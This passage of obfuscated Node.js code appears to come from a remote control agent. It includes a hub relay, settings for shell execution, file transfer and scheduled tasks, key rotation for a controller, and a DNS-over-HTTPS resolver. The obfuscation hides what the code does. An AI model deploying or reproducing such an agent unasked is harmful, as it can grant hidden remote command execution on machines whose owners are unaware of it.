        m = !![];
        for (const r of l)
            j[dO(0xb36)](r[dO(0x426)], { 'binary': r[dO(0x300)] });
        l[dO(0x615)] = 0x0;
    }), j['on'](c[dN(0xe70)], (r, s) => {
        const dP = dN;
        if (c[dP(0xb13)](a[dP(0x37e)], a[dP(0xa42)]))
            a[dP(0xb36)](r, { 'binary': s });
    }), j['on'](dN(0xd81), () => {
        const dQ = dN;
        try {
            a[dQ(0xd81)](0x3e8, c[dQ(0xb28)]);
        } catch (r) {
        }
    }), j['on']('error', () => {
        const dR = dN;
        try {
            a['close'](0x3f3, c[dR(0xec6)]);
        } catch (r) {
        }
    }), a['on'](c[dN(0xe70)], (r, s) => {
        const dS = dN;
        if (m)
            j['send'](r, { 'binary': s });
        else
            l[dS(0x59a)]({
                'data': r,
                'binary': s
            });
    }), a['on'](c[dN(0x7c2)], () => {
        const dT = dN;
        try {
            j[dT(0xd81)]();
        } catch (r) {
        }
    }), a['on'](c[dN(0x8db)], () => {
        const dU = dN;
        try {
            j[dU(0xd81)]();
        } catch (r) {
        }
    });
}
function a0ao(a, b) {
    const c = new Error(b);
    return c['relayCode'] = a, c;
}
function a0ap(a, b, c, d, f, g) {
    const dV = a0d0, h = {
            'xavru': function (i, j) {
                return i > j;
            },
            'gnXnP': function (i, j) {
                return i + j;
            },
            'vWWaX': 'error',
            'flXyK': function (i, j, k) {
                return i(j, k);
            },
            'MPmbX': dV(0x1a2),
            'KDaQm': function (i, j) {
                return i(j);
            },
            'BJuvK': function (i, j) {
                return i === j;
            },
            'EMJoi': dV(0xbc7)
        };
    return new Promise((i, j) => {
        const dX = dV, k = {
                'YGJVe': function (o, p) {
                    return o(p);
                },
                'Rdfbd': function (o, p, q) {
                    const dW = a0b;
                    return h[dW(0xd9e)](o, p, q);
                },
                'dSgND': h[dX(0x518)],
                'htDtA': function (o, p) {
                    const dY = dX;
                    return h[dY(0xc13)](o, p);
                }
            };
        let l;
        try {
            l = new URL(b);
        } catch (o) {
            return j(o);
        }
        const m = h[dX(0x270)](l['protocol'], h['EMJoi']) ? a0h : a0g, n = m[dX(0x6be)](l, {
                'method': a,
                'headers': c
            }, p => {
                const e0 = dX, q = {
                        'MmnPD': function (v, w) {
                            const dZ = a0b;
                            return h[dZ(0x42a)](v, w);
                        },
                        'uDFUE': function (v, w) {
                            return h['gnXnP'](v, w);
                        }
                    }, r = [];
                let s = 0x0, t = ![];
                p['on'](e0(0x426), v => {
                    const e1 = e0;
                    s += v[e1(0x615)];
                    if (q['MmnPD'](s, q['uDFUE'](g, 0x1))) {
                        t = !![], p[e1(0x4d7)]();
                        return;
                    }
                    r['push'](v);
                }), p['on'](e0(0x65c), () => {
                    const e2 = e0;
                    if (t)
                        return k['YGJVe'](j, k[e2(0x43e)](a0ao, e2(0x4c1), k['dSgND']));
                    k[e2(0xb82)](i, {
                        'status': p[e2(0x12e)],
                        'headers': p[e2(0xe76)],
                        'body': Buffer[e2(0x7b6)](r)
                    });
                }), p['on'](h[e0(0x29c)], j);
            });
        n[dX(0xdb6)](f, () => n[dX(0x4d7)](new Error(dX(0x6ae)))), n['on'](h[dX(0x29c)], j);
        if (d && d['length'])
            n[dX(0x5a6)](d);
        n[dX(0x65c)]();
    });
}
function a0aq(a) {
    const e3 = a0d0, b = {
            'otYui': function (d, f) {
                return d(f);
            },
            'PikwW': function (d, f) {
                return d === f;
            },
            'HnSqg': e3(0x325),
            'ZQwLm': e3(0x8d6)
        }, c = {};
    for (const [d, f] of Object[e3(0x471)](a || {})) {
        const g = b['otYui'](String, d)[e3(0x777)]();
        if (a0a5[e3(0xbe6)](g) || b[e3(0xec5)](g, b[e3(0x46b)]) || g[e3(0x46a)](b[e3(0x2ab)]))
            continue;
        c[d] = f;
    }
    return c;
}
function a0ar(a) {
    const e4 = a0d0, b = {
            'WkNMe': function (m, n, o) {
                return m(n, o);
            },
            'UsagY': e4(0xb60),
            'KnqNn': function (m, n, o) {
                return m(n, o);
            },
            'tdzuY': function (m, n) {
                return m + n;
            },
            'TYpOI': function (m, n) {
                return m(n);
            },
            'KdFCV': e4(0x69b)
        }, {
            port: c,
            whitelist: d,
            path: f,
            query: g,
            headers: h,
            body: i,
            maxBody: j
        } = a;
    if (d && !d[e4(0xd32)](c))
        throw b[e4(0xcb6)](a0ao, b['UsagY'], e4(0x908)[e4(0x7b6)](c, '\x20未在反代白名单'));
    if (i && i['length'] > j)
        throw b['KnqNn'](a0ao, 'body_too_large', '请求体超过\x20KISAMA_HUB_MAX_BODY\x20('[e4(0x7b6)](j, e4(0xe9e)));
    const k = e4(0xf08)[e4(0x7b6)](c)[e4(0x7b6)](f)['concat'](g ? b['tdzuY']('?', g) : ''), l = b['TYpOI'](a0ab, h);
    if (a[e4(0x50f)])
        l[b[e4(0xdd4)]] = a['forwardedFor'];
    return {
        'url': k,
        'headers': l
    };
}
function a0as(a, b, c, d, f) {
    const e5 = a0d0, g = {
            'Ejeye': function (h, i) {
                return h(i);
            },
            'LHHiH': function (h, i) {
                return h === i;
            },
            'BkoJD': 'https:',
            'mlWUf': e5(0x755)
        };
    return new Promise((h, i) => {
        const e6 = e5;
        let j;
        try {
            j = new URL(b);
        } catch (m) {
            return g[e6(0x1d6)](i, m);
        }
        const k = g['LHHiH'](j[e6(0xcf9)], g[e6(0xdc4)]) ? a0h : a0g, l = k[e6(0x6be)](j, {
                'method': a,
                'headers': c
            }, n => {
                const e7 = e6;
                h({
                    'status': n[e7(0x12e)],
                    'headers': n[e7(0xe76)],
                    'res': n
                });
            });
        l[e6(0xdb6)](f, () => l['destroy'](new Error(e6(0x6ae)))), l['on'](g[e6(0x2ae)], i);
        if (d && d['length'])
            l[e6(0x5a6)](d);
        l[e6(0x65c)]();
    });
}
async function a0at(a) {
    const e8 = a0d0, b = {
            'kVRXD': function (n, o) {
                return n(o);
            },
            'mORaL': function (n, o, p, q, r, s, t) {
                return n(o, p, q, r, s, t);
            },
            'oDdfQ': function (n, o, p) {
                return n(o, p);
            },
            'aQOQJ': 'loopback_unreachable',
            'wtssp': e8(0x4c1)
        }, {
            url: c,
            headers: d
        } = b['kVRXD'](a0ar, a), {
            port: f,
            maxBody: g,
            relayTimeout: h,
            method: i,
            body: j
        } = a;
    let k, l, m;
    try {
        a['requestFn'] ? {
            status: k,
            headers: l,
            body: m
        } = await a[e8(0x335)](i, c, d, j) : {
            status: k,
            headers: l,
            body: m
        } = await b[e8(0x2a0)](a0ap, i, c, d, j, h, g);
    } catch (n) {
        if (n && n[e8(0x5e2)])
            throw n;
        throw b['oDdfQ'](a0ao, b['aQOQJ'], b['kVRXD'](String, n && n[e8(0xf18)] || n)[e8(0x174)](0x0, 0x12c));
    }
    if (m['length'] > g)
        throw a0ao(b['wtssp'], e8(0x57a)[e8(0x7b6)](g, e8(0xe9e)));
    return {
        'status': k,
        'headers': l,
        'body': m
    };
}
function a0au(a, c, d) {
    const e9 = a0d0, g = {
            'mrpPj': function (k, l) {
                return k || l;
            },
            'fMfgy': function (k, l) {
                return k * l;
            }
        }, h = Math[e9(0x8b4)](0.5, g[e9(0x785)](c, 0x2)), i = Math['max'](h, g[e9(0x785)](d, 0x3c)), j = Math[e9(0x8b4)](0x0, a - 0x1);
    return Math[e9(0xb66)](g[e9(0x223)](h, Math['pow'](0x2, j)), i);
}
function a0av() {
    const ea = a0d0;
    return new Date()[ea(0xdac)]()[ea(0xde0)](/\.\d{3}Z$/, 'Z');
}
class a0aw extends Error {
    constructor(a, b) {
        const eb = a0d0, c = { 'Djsjb': eb(0x743) };
        super('['[eb(0x7b6)](a, ']\x20')[eb(0x7b6)](b)), this[eb(0xe77)] = c['Djsjb'], this[eb(0x46f)] = a;
    }
}
class a0ax {
    static [a0d0(0x776)] = parseInt(process.env.EXEC_TIMEOUT || '30');
    static [a0d0(0xce0)] = (process.env.EXEC_SHELL || 'true')['toLowerCase']() === a0d0(0xd97);
    static [a0d0(0x892)] = (process.env.DEBUG || a0d0(0xa35))[a0d0(0x777)]() === 'true';
    static [a0d0(0x7fe)] = parseInt(process.env.TIMESTAMP_WINDOW || a0d0(0x128));
    static [a0d0(0xd02)] = parseInt(process.env.LOG_LEVEL || (this[a0d0(0x892)] ? '0' : '3'), 0xa);
    static ['ECDSA_PUBLIC_KEY_PEM'] = a0ax[a0d0(0x802)](a0d0(0x71a), a0d0(0xe89)) || 'ECDSA公钥内容';
    static [a0d0(0x467)] = a0ax[a0d0(0x802)](a0d0(0x172), a0d0(0xa88)) || 'ECIES公钥内容';
    static [a0d0(0xc64)] = parseInt(process.env.TEMPKEY_TTL || '24', 0xa);
    static [a0d0(0x29f)] = parseInt(process.env.TEMPKEY_MAX_TTL || a0d0(0x903), 0xa);
    static [a0d0(0x45b)] = a0T();
    static [a0d0(0x612)] = parseInt(process.env.MAX_UPLOAD_SIZE || '104857600');
    static [a0d0(0xaa6)] = (process.env.FOLLOW_SYMLINKS || a0d0(0xa35))[a0d0(0x777)]() === a0d0(0xd97);
    static [a0d0(0x87f)] = Number[a0d0(0xed8)](parseInt(process.env.DOWNLOAD_ENCRYPT_MAX || '4194304', 0xa)) ? parseInt(process.env.DOWNLOAD_ENCRYPT_MAX || '4194304', 0xa) : 0x400000;
    static [a0d0(0x5f7)] = (process.env.FILE_AUDIT_LOG || a0d0(0xd97))['toLowerCase']() === a0d0(0xd97);
    static [a0d0(0x158)] = !![];
    static ['onetasks'] = [];
    static [a0d0(0xb71)] = {};
    static [a0d0(0xe75)] = ![];
    static ['TASK_TIMEOUT'] = parseInt(process.env.TASK_TIMEOUT || a0d0(0x141));
    static [a0d0(0xe27)] = parseInt(process.env.CRON_INTERVAL || '30');
    static [a0d0(0xbed)] = [];
    static [a0d0(0x54a)] = [];
    static [a0d0(0x2c2)] = parseInt(process.env.MAX_TASK_LOG || a0d0(0x715));
    static [a0d0(0x1e0)] = process.env.HOST || a0d0(0x8f0);
    static [a0d0(0xb49)] = parseInt(process.env.KPORT || process.env.PORT || process.env.SERVER_PORT || '8000');
    static [a0d0(0xa6a)] = ((() => {
        const ec = a0d0, a = {
                'Johqk': function (c, d) {
                    return c || d;
                }
            }, b = (process.env.KMODE || '0')[ec(0x27f)]();
        return /^2q(?:uic)?$/i[ec(0xdbb)](b) ? '2' : a[ec(0x1f5)](b, '0');
    })());
    static [a0d0(0xbe7)] = /^2q(?:uic)?$/i[a0d0(0xdbb)]((process.env.KMODE || '')[a0d0(0x27f)]());
    static ['KNAME'] = (process.env.KNAME || '')[a0d0(0x27f)]();
    static [a0d0(0x9cc)] = (process.env.KNAME_KEY || '')[a0d0(0x27f)]();
    static [a0d0(0xcd4)] = process.env.KPATH || '';
    static ['KHUB'] = (process.env.KHUB || '')[a0d0(0x27f)]()['replace'](/\/+$/, '');
    static ['KHUB_PUBLIC_URL'] = (process.env.KHUB_PUBLIC_URL || '')[a0d0(0x27f)]()[a0d0(0xde0)](/\/+$/, '');
    static [a0d0(0xdaa)] = a0a6(process.env.KHUB_PORTS || '');
    static [a0d0(0x8c1)] = a0a6(process.env.KPROXY_PORTS || '');
    static ['KISAMA_HUB_RETRY_BASE_SECONDS'] = parseFloat(process.env.KISAMA_HUB_RETRY_BASE_SECONDS || '2') || 0x2;
    static [a0d0(0xcbf)] = parseFloat(process.env.KISAMA_HUB_RETRY_MAX_SECONDS || '60') || 0x3c;
    static ['KISAMA_HUB_PING_INTERVAL'] = parseFloat(process.env.KISAMA_HUB_PING_INTERVAL || '20') || 0x14;
    static [a0d0(0xed0)] = parseFloat(process.env.KISAMA_HUB_RELAY_TIMEOUT || '60') || 0x3c;
    static [a0d0(0xa94)] = parseInt(process.env.KISAMA_HUB_MAX_BODY || String(0x40 * 0x400 * 0x400), 0xa) || 0x40 * 0x400 * 0x400;
    static [a0d0(0x8b7)] = (process.env.KISAMA_DNS || a0d0(0x13d))['trim']()[a0d0(0x777)]();
    static [a0d0(0x654)] = (process.env.KISAMA_DOH_SERVERS || '')[a0d0(0x27f)]();
    static [a0d0(0xb5)] = [
        'https://223.5.5.5/resolve',
        a0d0(0x624),
        a0d0(0x267)
    ];
    static ['AGENT_VERSION'] = process.env.AGENT_VERSION || a0d0(0x87b);
    static ['SESSION_KEY'] = a0k[a0d0(0x91e)](0x20)[a0d0(0xa27)](a0d0(0xc75));
    static ['NOISE_KEYS_INTERNAL'] = a0a2[a0d0(0x51a)]();
    static ['wsDowngradeToken']() {
        const ed = a0d0, a = {
                'ZUWBT': 'base64',
                'eJXuo': ed(0x7d6)
            };
        return a0k[ed(0xd10)](ed(0x904), Buffer[ed(0x58d)](this['SESSION_KEY'], a[ed(0x32c)]))[ed(0xaf5)](a[ed(0x37d)])['digest'](a[ed(0x32c)]);
    }
    static [a0d0(0xaac)]() {
        const ee = a0d0, a = {
                'vqZXE': ee(0xc75),
                'SLZyw': '🔄\x20[SECURITY]\x20临时密钥过期,\x20已轮换\x20SESSION_KEY\x20与控制端\x20Noise\x20密钥对\x20(合法控制端需重新认证获取\x20baseinfo\x20新密钥)'
            }, b = a0a2['generatePair']();
        this['NOISE_KEYS_INTERNAL'][ee(0x4f6)] = b[ee(0x4f6)], this['NOISE_KEY'][ee(0xa1e)][ee(0x103)] = b['control']['private_b64'], this['SESSION_KEY'] = a0k[ee(0x91e)](0x20)[ee(0xa27)](a[ee(0xd6c)]), this[ee(0x4c2)] = null, this['_status_cache_time'] = 0x0, a0R[ee(0x9cd)](a[ee(0x536)]);
    }
    static [a0d0(0xf25)] = {
        'controller': { 'private': this['NOISE_KEYS_INTERNAL'][a0d0(0x4f6)][a0d0(0x1aa)] },
        'agent': { 'public': this[a0d0(0x2a1)][a0d0(0x47e)]['public_b64'] }
    };
    static [a0d0(0x602)] = 0xe10;
    static [a0d0(0xa52)] = 0x1e;
    static ['BASEINFO_FAIL_BACKOFF'] = 0x3c;
    static [a0d0(0x8a7)] = 0x1e;
    static ['_baseinfo_p_cache'] = null;
    static ['_baseinfo_p_promise'] = null;
    static [a0d0(0xc81)] = null;
    static [a0d0(0xcb)] = 0x0;
    static [a0d0(0xd8d)] = 0x0;
    static [a0d0(0x2a6)] = null;
    static [a0d0(0x4c9)] = null;
    static ['_baseinfo_net_time'] = 0x0;
    static ['_baseinfo_net_fail_time'] = 0x0;
    static ['_baseinfo_net_promise'] = null;
    static [a0d0(0x4c2)] = null;
    static [a0d0(0xebe)] = 0x0;
    static [a0d0(0x7df)] = null;
    static ['_baseInfoNowMs']() {
        const ef = a0d0, a = {
                'KETCY': function (b, c) {
                    return b(c);
                },
                'dLcvG': function (b, c) {
                    return b / c;
                }
            };
        return a['KETCY'](Number, a['dLcvG'](process[ef(0xe73)][ef(0x18f)](), 0xf4240n));
    }
    static ['_cloneBaseInfoPart'](a) {
        return a ? { ...a } : null;
    }
    static async ['getBaseInfoP']() {
        const eg = a0d0;
        if (this[eg(0xbcc)])
            return this[eg(0x62d)](this[eg(0xbcc)]);
        return !this['_baseinfo_p_promise'] && (this[eg(0x1dd)] = new a0aI()[eg(0x3a3)]()[eg(0xef4)](a => {
            const eh = eg;
            return a0R[eh(0xb89)](eh(0x6b3)[eh(0x7b6)](a['message']), 0x1), a0aI[eh(0x80b)]();
        })[eg(0x9f0)](a => {
            return this['_baseinfo_p_cache'] = a, a;
        })[eg(0x290)](() => {
            const ei = eg;
            this[ei(0x1dd)] = null;
        })), this['_cloneBaseInfoPart'](await this[eg(0x1dd)]);
    }
    static async ['getBaseInfoLocal'](a) {
        const ej = a0d0, b = {
                'ssIpw': function (d, f) {
                    return d < f;
                },
                'jRISm': function (d, f) {
                    return d - f;
                },
                'DCABg': function (d, f) {
                    return d * f;
                },
                'bwdmr': function (d, f) {
                    return d - f;
                },
                'iMjml': function (d, f) {
                    return d * f;
                }
            }, c = this[ej(0x702)]();
        if (this[ej(0xc81)] && b[ej(0xa61)](b[ej(0xf11)](c, this[ej(0xcb)]), b[ej(0xe2a)](this[ej(0xa52)], 0x3e8)))
            return this[ej(0x62d)](this[ej(0xc81)]);
        if (this[ej(0xd8d)] && b[ej(0xa61)](b['bwdmr'](c, this[ej(0xd8d)]), b[ej(0xab8)](this[ej(0x411)], 0x3e8)))
            return this['_cloneBaseInfoPart'](this['_baseinfo_local_cache'] || a0aI[ej(0x3ba)]());
        return !this[ej(0x2a6)] && (this[ej(0x2a6)] = new a0aI()[ej(0xcc)](a)[ej(0x9f0)](d => {
            const ek = ej;
            return this[ek(0xc81)] = d, this[ek(0xcb)] = this['_baseInfoNowMs'](), this['_baseinfo_local_fail_time'] = 0x0, d;
        })[ej(0xef4)](d => {
            const el = ej;
            return a0R[el(0xb89)](el(0xa7d)[el(0x7b6)](d[el(0xf18)]), 0x1), this['_baseinfo_local_fail_time'] = this['_baseInfoNowMs'](), this['_baseinfo_local_cache'] || a0aI[el(0x3ba)]();
        })[ej(0x290)](() => {
            const em = ej;
            this[em(0x2a6)] = null;
        })), this['_cloneBaseInfoPart'](await this[ej(0x2a6)]);
    }
    static async [a0d0(0xb4e)]() {
        const en = a0d0, a = {
                'wTizP': function (c, d) {
                    return c - d;
                },
                'LDcvq': function (c, d) {
                    return c * d;
                },
                'SRCcl': function (c, d) {
                    return c < d;
                }
            }, b = this[en(0x702)]();
        if (this[en(0x4c9)] && a[en(0xe98)](b, this[en(0xe19)]) < a[en(0xeac)](this[en(0x602)], 0x3e8))
            return this[en(0x62d)](this[en(0x4c9)]);
        if (this[en(0x22e)] && a[en(0x4e9)](a['wTizP'](b, this[en(0x22e)]), this['BASEINFO_FAIL_BACKOFF'] * 0x3e8))
            return this[en(0x62d)](this[en(0x4c9)] || a0aI[en(0xcda)]());
        return !this[en(0x40d)] && (this[en(0x40d)] = new a0aI()[en(0xc98)]()[en(0x9f0)](c => {
            const eo = en;
            return this[eo(0x4c9)] = c, this['_baseinfo_net_time'] = this['_baseInfoNowMs'](), this[eo(0x22e)] = 0x0, c;
        })[en(0xef4)](c => {
            const ep = en;
            return a0R[ep(0xb89)](ep(0xef3)[ep(0x7b6)](c['message']), 0x1), this[ep(0x22e)] = this[ep(0x702)](), this[ep(0x4c9)] || a0aI[ep(0xcda)]();
        })['finally'](() => {
            const eq = en;
            this[eq(0x40d)] = null;
        })), this[en(0x62d)](await this[en(0x40d)]);
    }
    static [a0d0(0x802)](a, b) {
        const er = a0d0, c = { 'XTuZQ': er(0x132) }, d = process.env[a];
        if (d)
            return d;
        const f = a0o[er(0x782)](__dirname, b);
        if (a0l[er(0x7d2)](f))
            try {
                return a0l['readFileSync'](f, c[er(0x57e)])[er(0x27f)]();
            } catch (g) {
            }
        return '';
    }
    static [a0d0(0x42e)]() {
        const es = a0d0, a = {
                'Bblin': 'ECDSA_PUBKEY:\x20未设置环境变量且文件\x20keys/agent_ecdsa_pub.pem\x20不存在',
                'ldYeE': es(0x901),
                'YtZEY': '\x20\x20\x202.\x20或将密钥文件放入\x20./keys/\x20目录\x20(运行\x20generate_keys.py\x20生成)',
                'nCeQK': '\x20\x20\x201.\x20设置环境变量:\x20export\x20ECDSA_PUBKEY=\x27-----BEGIN\x20PUBLIC\x20KEY-----\x27...\x27',
                'zkmCm': '\x0a💡\x20解决方法:'
            };
        if (!this[es(0x892)]) {
            const b = [];
            !this[es(0xda6)] && b[es(0x59a)](a[es(0x311)]);
            !this[es(0x467)] && b['push'](es(0x63c));
            if (b[es(0x615)] > 0x0) {
                const c = a['ldYeE'][es(0xc0)]('|');
                let d = 0x0;
                while (!![]) {
                    switch (c[d++]) {
                    case '0':
                        b[es(0xd36)](f => a0R['error'](es(0x6d9)[es(0x7b6)](f)));
                        continue;
                    case '1':
                        a0R[es(0xb89)](a['YtZEY']);
                        continue;
                    case '2':
                        a0R[es(0xb89)](a[es(0x5a3)]);
                        continue;
                    case '3':
                        a0R['debug'](a[es(0x436)]);
                        continue;
                    case '4':
                        a0R['error'](es(0xd14));
                        continue;
                    case '5':
                        process['exit'](0x1);
                        continue;
                    }
                    break;
                }
            }
        }
    }
    static [a0d0(0x5ff)](a = {}) {
        const et = a0d0, b = {
                'FhLsX': function (c, d) {
                    return c !== d;
                },
                'Ltoai': function (c, d, f) {
                    return c(d, f);
                },
                'eLlVy': function (c, d) {
                    return c(d);
                },
                'yowWi': function (c, d) {
                    return c(d);
                },
                'QDiNZ': function (c, d) {
                    return c(d);
                },
                'jEHZI': function (c, d) {
                    return c(d);
                },
                'rdPzl': function (c, d) {
                    return c !== d;
                },
                'oLhwh': function (c, d) {
                    return c !== d;
                },
                'DFfZQ': function (c, d) {
                    return c(d);
                },
                'pnkiU': function (c, d) {
                    return c !== d;
                },
                'HfwHM': function (c, d) {
                    return c !== d;
                },
                'uvhvd': function (c, d) {
                    return c !== d;
                },
                'FwMEJ': function (c, d) {
                    return c !== d;
                },
                'FvUqC': function (c, d) {
                    return c(d);
                },
                'poajj': function (c, d) {
                    return c !== d;
                },
                'oCHfN': function (c, d) {
                    return c(d);
                },
                'MBdhv': function (c, d) {
                    return c(d);
                }
            };
        if (!a)
            return;
        b[et(0x6ec)](a['PORT'], undefined) && a[et(0xb49)] !== null && (this[et(0xb49)] = b[et(0x123)](parseInt, b[et(0x26f)](String, a[et(0xb49)]), 0xa));
        a['ECDSA_PUBLIC_KEY_PEM'] && (this['ECDSA_PUBLIC_KEY_PEM'] = a[et(0xda6)][et(0x27f)]());
        a[et(0x467)] && (this[et(0x467)] = a[et(0x467)][et(0x27f)]());
        if (b[et(0x6ec)](a[et(0xa6a)], undefined) && a[et(0xa6a)] !== null) {
            const c = b[et(0x489)](String, a[et(0xa6a)])[et(0x27f)]();
            if (/^(?:0|1|2|2q|2quic|3)$/i['test'](c)) {
                const d = c[et(0x777)]();
                this[et(0xa6a)] = d['startsWith']('2') ? '2' : d, this[et(0xbe7)] = /^2q(?:uic)?$/[et(0xdbb)](d);
            } else
                this[et(0xa6a)] = '0', this['KMODE_QUIC'] = ![], a0R[et(0x9cd)](et(0x640)[et(0x7b6)](b[et(0xe2c)](String, a[et(0xa6a)]), et(0xcde)));
        }
        a['KNAME'] && b[et(0x26f)](String, a['KNAME'])[et(0x27f)]() && (this[et(0x39e)] = b['QDiNZ'](String, a['KNAME'])[et(0x27f)]()), a[et(0x9cc)] && b[et(0x26f)](String, a['KNAME_KEY'])['trim']() && (this[et(0x9cc)] = b[et(0x489)](String, a['KNAME_KEY'])['trim']()), a[et(0xcd4)] && b[et(0x489)](String, a[et(0xcd4)])['trim']() && (this[et(0xcd4)] = b[et(0x47a)](String, a[et(0xcd4)])['trim']()), b[et(0xd6b)](a[et(0x828)], undefined) && b['oLhwh'](a[et(0x828)], null) && (this[et(0x828)] = b[et(0xccc)](String, a[et(0x828)])['trim']()[et(0xde0)](/\/+$/, '')), b[et(0xb11)](a['KHUB_PUBLIC_URL'], undefined) && b[et(0x1f4)](a['KHUB_PUBLIC_URL'], null) && (this[et(0xacc)] = b[et(0xe2c)](String, a[et(0xacc)])[et(0x27f)]()[et(0xde0)](/\/+$/, '')), b[et(0xc0f)](a[et(0xdaa)], undefined) && b['FwMEJ'](a[et(0xdaa)], null) && (this[et(0xdaa)] = b[et(0x47a)](a0a6, b['FvUqC'](String, a[et(0xdaa)]))), b[et(0xa99)](a[et(0x8c1)], undefined) && b[et(0xe21)](a[et(0x8c1)], null) && (this[et(0x8c1)] = b[et(0x546)](a0a6, b['MBdhv'](String, a[et(0x8c1)])));
    }
}
const a0ay = require(a0d0(0x538)), a0az = require(a0d0(0x8f8));
class a0aA {
    static [a0d0(0x2ff)] = 0x1e;
    static [a0d0(0x90d)] = 0x258;
    static [a0d0(0x23e)] = 0x3c;
    static [a0d0(0xe2)] = 0x3c;
    static [a0d0(0xca2)] = 0x12c;
    static [a0d0(0x7c3)];
    static ['_globalHook'] = null;
    constructor(a = {}) {
        const eu = a0d0, b = (a[eu(0x652)] && a[eu(0x652)][eu(0x615)] ? a['servers'] : a0ax[eu(0xb5)])[eu(0x9c5)](c => String(c)[eu(0x27f)]()['replace'](/\/+$/, ''))[eu(0x74d)](Boolean);
        this[eu(0x652)] = b['length'] ? b : [...a0ax[eu(0xb5)]], this[eu(0x4ab)] = a[eu(0x4ab)] || 0xbb8, this[eu(0x111)] = a['queryFn'] || ((c, d, f) => this['dohQuery'](c, d, f)), this[eu(0xac2)] = new Map(), this[eu(0xcaf)] = new Map(), this[eu(0xaa2)] = this[eu(0x652)][eu(0x9c5)](() => 0x0), this[eu(0xc1b)] = 0x0;
    }
    async ['resolve'](a, b) {
        const ev = a0d0, c = {
                'Kaesr': function (j, k) {
                    return j === k;
                },
                'rrmUg': function (j, k) {
                    return j * k;
                },
                'dubyA': function (j, k) {
                    return j + k;
                },
                'Vwysl': ev(0xa1a),
                'zmPwV': function (j, k) {
                    return j > k;
                }
            };
        b = b || 0x0;
        const d = ''[ev(0x7b6)](a, '|')['concat'](b), f = Date[ev(0x430)](), g = this[ev(0xac2)][ev(0xb2b)](d);
        if (g && c['zmPwV'](g[ev(0x307)], f))
            return g['ips'][ev(0x174)]();
        const h = this[ev(0xcaf)][ev(0xb2b)](d);
        if (h)
            return h;
        const i = ((async () => {
            const ew = ev, j = await this[ew(0xb41)](a, b);
            if (c[ew(0x51c)](j[ew(0xab3)], 'ok') && j[ew(0xb86)]['length']) {
                const k = c[ew(0x495)](Math[ew(0xb66)](Math['max'](j['ttl'], a0aA[ew(0x2ff)]), a0aA[ew(0x90d)]), 0x3e8);
                return this['cache'][ew(0x6e7)](d, {
                    'ips': j[ew(0xb86)]['slice'](),
                    'expire': c[ew(0x6e8)](Date[ew(0x430)](), k)
                }), j[ew(0xb86)][ew(0x174)]();
            }
            if (j[ew(0xab3)] === c[ew(0x2b8)])
                return this[ew(0xac2)][ew(0x6e7)](d, {
                    'ips': [],
                    'expire': c[ew(0x6e8)](Date['now'](), a0aA[ew(0x23e)] * 0x3e8)
                }), [];
            return null;
        })());
        this[ev(0xcaf)][ev(0x6e7)](d, i);
        try {
            return await i;
        } finally {
            this[ev(0xcaf)]['delete'](d);
        }
    }
    async [a0d0(0xb41)](a, b) {
        const ex = a0d0, c = {
                'Stmyu': function (k, l) {
                    return k !== l;
                },
                'TBidD': function (k, l) {
                    return k === l;
                },
                'SOsMz': ex(0x755)
            }, d = [];
        if (b !== 0x6)
            d['push']([
                0x1,
                0x4
            ]);
        if (c[ex(0xee4)](b, 0x4))
            d['push']([
                0x1c,
                0x6
            ]);
        const f = {
            0x4: [],
            0x6: []
        };
        let g = ![], h = ![], i = ![], j = a0aA[ex(0x90d)];
        for (const [k, l] of d) {
            try {
                const m = await this['queryOne'](a, k);
                c[ex(0x3e8)](m['status'], 'ok') && m[ex(0xb86)][ex(0x615)] ? (g = !![], f[l] = m[ex(0xb86)], j = Math['min'](j, m[ex(0x4b6)])) : h = !![];
            } catch (n) {
                i = !![];
            }
        }
        if (g)
            return {
                'status': 'ok',
                'ips': this[ex(0xaae)](f[0x6], f[0x4]),
                'ttl': j
            };
        if (h && !i)
            return {
                'status': ex(0xa1a),
                'ips': [],
                'ttl': 0x0
            };
        return {
            'status': c['SOsMz'],
            'ips': [],
            'ttl': 0x0
        };
    }
    async ['queryOne'](a, b) {
        const ey = a0d0, c = {
                'Okwge': function (f, g) {
                    return f < g;
                },
                'sHdOj': function (f, g) {
                    return f < g;
                },
                'gGdtG': function (f, g) {
                    return f * g;
                },
                'iMWfr': ey(0xbfb),
                'BqJgt': function (f, g) {
                    return f === g;
                },
                'TNPnd': function (f, g) {
                    return f !== g;
                },
                'ldath': function (f, g, h) {
                    return f(g, h);
                },
                'kPIoj': ey(0xa1a),
                'lJnHo': ey(0xc02)
            }, d = a0aA[ey(0x28b)](a);
        for (let f = 0x0; c[ey(0x48b)](f, this[ey(0x652)][ey(0x615)]); f++) {
            if (c[ey(0xb14)](Date[ey(0x430)](), this[ey(0xaa2)][f]))
                continue;
            let g;
            try {
                g = await this[ey(0x111)](this['servers'][f], d, b);
            } catch (l) {
                this[ey(0xaa2)][f] = Date['now']() + c[ey(0x353)](a0aA[ey(0xe2)], 0x3e8);
                continue;
            }
            const h = g && typeof g === c[ey(0x1b1)] ? g[ey(0xa74)] || 0x0 : 0x1;
            if (c[ey(0x100)](h, 0x3))
                return {
                    'status': ey(0xa1a),
                    'ips': [],
                    'ttl': 0x0
                };
            if (c[ey(0x4c4)](h, 0x0))
                continue;
            const j = [];
            let k = a0aA[ey(0x90d)];
            for (const m of g[ey(0xc0b)] || []) {
                if (!m || c[ey(0x4c4)](m['type'], b))
                    continue;
                if (typeof m[ey(0x426)] !== ey(0xefa) || !a0aA['validLiteral'](m[ey(0x426)], b))
                    continue;
                j['push'](m['data']);
                const n = c[ey(0xc49)](parseInt, m[ey(0x338)], 0xa);
                if (Number[ey(0xed8)](n))
                    k = Math[ey(0xb66)](k, n);
            }
            if (j['length'])
                return {
                    'status': 'ok',
                    'ips': [...new Set(j)],
                    'ttl': k
                };
            return {
                'status': c['kPIoj'],
                'ips': [],
                'ttl': 0x0
            };
        }
        throw new Error(c['lJnHo']);
    }
    ['dohQuery'](a, b, c) {
        const ez = a0d0, d = {
                'XTlbf': function (f, g) {
                    return f !== g;
                },
                'hdttT': function (f, g) {
                    return f(g);
                },
                'scshZ': ez(0x426),
                'GSudr': ez(0x65c),
                'FVWCX': ez(0xbf),
                'sjmPT': ez(0xdd2),
                'iwFJl': ez(0xcb5),
                'sBaxr': ez(0x755)
            };
        return new Promise((f, g) => {
            const eB = ez, h = {
                    'QvcWA': function (j, k) {
                        const eA = a0b;
                        return d[eA(0xbc8)](j, k);
                    }
                }, i = a0h['request'](''['concat'](a, eB(0x38c))[eB(0x7b6)](d[eB(0xbc8)](encodeURIComponent, b), eB(0x21a))['concat'](c), {
                    'method': d['FVWCX'],
                    'timeout': this['timeoutMs'],
